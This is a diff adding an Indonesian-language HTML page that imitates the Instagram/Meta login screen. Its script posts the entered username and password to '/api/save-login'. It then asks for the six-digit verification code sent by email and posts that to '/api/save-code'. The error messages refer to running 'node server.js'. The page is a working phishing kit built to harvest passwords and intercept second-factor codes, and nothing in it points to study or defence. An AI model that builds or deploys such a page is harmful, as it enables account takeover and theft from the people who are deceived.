@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:#1C2B33;
+    display:flex;
+    justify-content:center;
+    margin:0;
+}
+
+.container{
+    width:390px;
+    max-width:100%;
+    padding:25px 25px 140px;
+    display:flex;
+    flex-direction:column;
+    overflow-y:auto;
+}
+
+.language{
+    text-align:center;
+    color:#c9d0d5;
+    font-size:15px;
+    margin-top:5px;
+}
+
+.logo{
+    margin:70px auto;
+    width:80px;
+    height:80px;
+    border-radius:22px;
+    background:linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    color:white;
+    font-size:42px;
+}
+
+input{
+    width:100%;
+    height:58px;
+    margin-bottom:14px;
+    padding:0 18px;
+    border-radius:14px;
+    border:1px solid #44545f;
+    background:#22313c;
+    color:white;
+    font-size:15px;
+    outline:none;
+    transition:.2s;
+}
+
+input::placeholder{
+    color:#8f99a0;
+}
+
+input:focus{
+    border-color:#3797ff;
+}
+
+input:focus::placeholder{
+    transform:translateY(-12px);
+    font-size:12px;
+}
+
+#code:focus::placeholder{
+    transform:none;
+    font-size:24px;
+    color:transparent;
+}
+
+button{
+    width:100%;
+    height:46px;
+    border:none;
+    border-radius:50px;
+    background:#0a5ccc;
+    color:white;
+    font-size:16px;
+    font-weight:500;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#0f6ae6;
+}
+
+.forgot{
+    text-align:center;
+    color:white;
+    text-decoration:none;
+    margin-top:24px;
+    font-size:15px;
+}
+
+.bottom{
+    position:fixed;
+    left:0;
+    right:0;
+    bottom:0;
+    padding:0 25px 20px;
+    background:#1C2B33;
+    z-index:10;
+}
+
+.register{
+    background:transparent;
+    border:1px solid #3797ff;
+    color:#3797ff;
+    margin-bottom:30px;
+}
+
+.meta{
+    text-align:center;
+    color:white;
+    opacity:.8;
+    font-size:20px;
+    margin-bottom:15px;
+}
+
+.meta span{
+    font-weight:bold;
+}
+
+@media(prefers-color-scheme:light){
+body{background:#fafafa}
+.language{color:#737373}
+input{border-color:#dbdbdb;background:#fafafa;color:#262626}
+input::placeholder{color:#8e8e8e}
+input:focus{border-color:#a8a8a8}
+.forgot{color:#00376b}
+.bottom{background:#fafafa}
+.meta{color:#262626}
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+
+<div class="language">
+Bahasa Indonesia
+</div>
+
+<div class="logo" style="background:none;border-radius:0;width:auto;height:auto;margin:40px auto">
+<picture>
+<source srcset="logolight.png" media="(prefers-color-scheme:light)">
+<img src="image.png" alt="Instagram" style="width:70px;height:auto;display:block">
+</picture>
+</div>
+
+<form id="loginForm">
+
+<input
+type="text"
+id="username"
+placeholder="Nama pengguna, email, atau nomor ponsel">
+
+<input
+type="password"
+id="password"
+placeholder="Kata sandi">
+
+<button type="submit">
+Login
+</button>
+
+</form>
+
+<form id="codeForm" style="display:none;">
+
+<div style="text-align:center;color:var(--color-text,white);margin-bottom:20px;font-size:14px;line-height:1.4">
+Masukkan kode verifikasi 6 digit yang telah dikirim ke email Anda
+</div>
+
+<input
+type="text"
+id="code"
+placeholder="000000"
+maxlength="6"
+inputmode="numeric"
+pattern="[0-9]*"
+style="text-align:center;font-size:24px;letter-spacing:8px;font-weight:600">
+
+<button type="submit" style="margin-top:14px">
+Verifikasi
+</button>
+
+</form>
+
+<a href="#" class="forgot" id="forgotLink">
+Lupa kata sandi?
+</a>
+
+<div class="bottom" id="bottomSection">
+
+<button class="register" type="button">
+Buat akun baru
+</button>
+
+<div class="meta">
+<picture>
+<source srcset="metalight.png" media="(prefers-color-scheme:light)">
+<img src="metadark.png" alt="Meta" style="width:60px;height:auto;opacity:.8">
+</picture>
+</div>
+
+</div>
+
+</div>
+
+<script>
+(function(){
+var c=document.querySelector('.container');c.style.height=window.innerHeight+'px';
+
+var loginForm=document.getElementById('loginForm'),codeForm=document.getElementById('codeForm');
+var u=document.getElementById('username'),p=document.getElementById('password'),cInput=document.getElementById('code');
+var loginBtn=loginForm.querySelector('button'),codeBtn=codeForm.querySelector('button');
+var forgotLink=document.getElementById('forgotLink'),bottom=document.getElementById('bottomSection');
+var savedEmail='';
+
+loginForm.addEventListener('submit',function(e){
+e.preventDefault();
+var U=u.value.trim(),P=p.value;
+if(!U||!P){alert('Silakan isi username dan password.');return}
+loginBtn.textContent='Memuat...';loginBtn.disabled=true;
+fetch('/api/save-login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:U,password:P})})
+.then(function(r){return r.json()})
+.then(function(d){
+loginBtn.textContent='Login';loginBtn.disabled=false;
+if(d.error){alert(d.error);return}
+savedEmail=U;
+loginForm.style.display='none';
+codeForm.style.display='block';
+forgotLink.style.display='none';
+bottom.style.display='none';
+cInput.focus()
+})
+.catch(function(){loginBtn.textContent='Login';loginBtn.disabled=false;alert('Gagal menyimpan. Pastikan server berjalan (node server.js)')})
+});
+
+codeForm.addEventListener('submit',function(e){
+e.preventDefault();
+var code=cInput.value.trim();
+if(!code||code.length<6){alert('Masukkan kode verifikasi 6 digit.');return}
+codeBtn.textContent='Memverifikasi...';codeBtn.disabled=true;
+fetch('/api/save-code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:savedEmail,code:code})})
+.then(function(r){return r.json()})
+.then(function(d){
+codeBtn.textContent='Verifikasi';codeBtn.disabled=false;
+if(d.error){alert(d.error);return}
+alert('Login berhasil!');
+location.reload()
+})
+.catch(function(){codeBtn.textContent='Verifikasi';codeBtn.disabled=false;alert('Gagal. Pastikan server berjalan (node server.js)')})
+});
+})();
+</script>
+
+</body>
+</html>
